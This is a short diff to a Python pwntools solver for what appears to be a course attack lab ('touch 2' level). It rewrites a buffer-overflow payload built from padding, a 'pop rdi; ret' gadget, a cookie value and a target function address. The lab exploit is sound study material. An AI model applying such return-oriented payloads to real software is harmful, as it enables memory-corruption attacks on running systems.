@@ -2,7 +2,7 @@ import os
 from typing import Callable
 
 import click
-from pwn import process, p64, gdb, asm, context
+from pwn import process, p64, gdb, asm
 
 from Crypto.Util.number import long_to_bytes
 
@@ -78,8 +78,9 @@ def binsh(flag: bool) -> None:
 
 def solve_level_2(flag: bool) -> None:
     solution = (
-        b"a" * BUF_SIZE # padding
-        + p64(0x4028f0) # pop rdi; ret
+        POPRDIRET
+        + b"a" * (BUF_SIZE - len(POPRDIRET)) # padding
+        + p64(0x5561e608) # pop rdi; ret
         + p64(COOKIE) # cookie value
         + p64(0x401828) # touch 2
     )
